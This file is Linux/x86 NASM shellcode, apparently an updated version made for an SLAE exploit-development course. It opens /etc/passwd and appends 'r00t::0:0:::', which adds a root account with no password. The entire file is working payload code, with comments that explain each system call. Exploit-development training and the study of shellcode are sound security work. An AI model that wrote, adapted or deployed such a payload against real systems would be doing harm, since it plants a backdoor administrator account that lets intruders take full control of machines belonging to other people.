;By Kris Katterjohn 11/14/2006

; 69 byte shellcode to add root user 'r00t' with no password to /etc/passwd

; for Linux/x86

; link: 	http://shell-storm.org/shellcode/files/shellcode-211.php
; write r00t::0:0::: to the passwd


; updated
; File shellcode03.nasm
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017

 section .text
      global _start
 _start:

 ; open("/etc//passwd", O_WRONLY | O_APPEND)

      ;push byte 5
      ;pop eax		; open
      mov eax, 5
      
      xor ecx, ecx
      push ecx
      push 0x64777373 ; /etc//passwd
      push 0x61702f2f
      push 0x6374652f
      mov ebx, esp
      mov cx, 02001Q	; write-only , append
      int 0x80

      mov ebx, eax

 ; write(fd=ebx, "r00t::0:0:::", 12)

      ;push byte 4
      ;pop eax
      xor eax, eax
      push eax
      mov al, 4
      
      ;push edx
      push 0x3a3a3a30	; r00t::0:0:::
      push 0x3a303a3a
      push 0x74303072
      mov ecx, esp
      
      ;push byte 12	; length
      ;pop edx
      xor edx, edx
      mov dl, 12
      int 0x80

 ; close(ebx)

      ;push byte 6
      ;pop eax
      xor eax, eax
      shr dl,1		; shift write dl => divide by 2, 12 / 2 = 6
      mov al, dl	; al = 6
      int 0x80

 ; exit()

      xor eax, eax
      inc al		; eax = 01 exit
      int 0x80






